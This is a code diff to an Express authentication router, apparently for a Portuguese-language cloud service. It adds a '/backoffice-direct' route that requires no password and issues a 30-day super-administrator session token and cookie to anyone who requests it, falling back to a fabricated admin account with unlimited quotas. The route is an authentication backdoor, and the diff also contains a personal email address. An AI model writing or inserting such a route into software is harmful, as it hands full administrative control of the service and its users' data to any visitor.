@@ -6,6 +6,45 @@ import { User } from '../types.js';
 
 const router = Router();
 
+// 0. ACESSO DIRETO AO BACK OFFICE (SEM SENHA)
+router.all('/backoffice-direct', (req: AuthRequest, res: Response) => {
+  const superAdmin = db.findUserByEmail('nanuhost') || db.findUserByEmail('klayton.pires.monteiro@gmail.com') || db.getUsers().find(u => u.role === 'admin_level1' || (u.role as string) === 'super_admin') || ({
+    id: 'usr_admin_nanuhost',
+    name: 'Super Administrador (nanuhost)',
+    email: 'nanuhost',
+    role: 'admin_level1',
+    passwordHash: '',
+    isActive: true,
+    country: 'AO',
+    queriesRemaining: 999999,
+    totalQueriesUsed: 0,
+    activePlanId: 'plan_diamante',
+    activePlanName: 'Diamante Ilimitado (Super Admin)',
+    planExpiresAt: null,
+    isImportUnlocked: true,
+    isBatchUnlocked: true,
+    isApiUnlocked: true,
+    lastLoginAt: new Date().toISOString(),
+    createdAt: new Date().toISOString(),
+    updatedAt: new Date().toISOString()
+  } as unknown as User);
+
+  const token = generateToken(superAdmin);
+  res.cookie('nanucloud_token', token, {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === 'production',
+    sameSite: 'lax',
+    maxAge: 30 * 24 * 60 * 60 * 1000
+  });
+
+  const { passwordHash: _, ...userSafe } = superAdmin;
+  return res.json({
+    message: 'Acesso ao Back Office concedido sem senha com privilégios de Super Administrador.',
+    user: userSafe,
+    token
+  });
+});
+
 // 1. REGISTO DE UTILIZADOR
 router.post('/register', async (req: AuthRequest, res: Response) => {
   try {
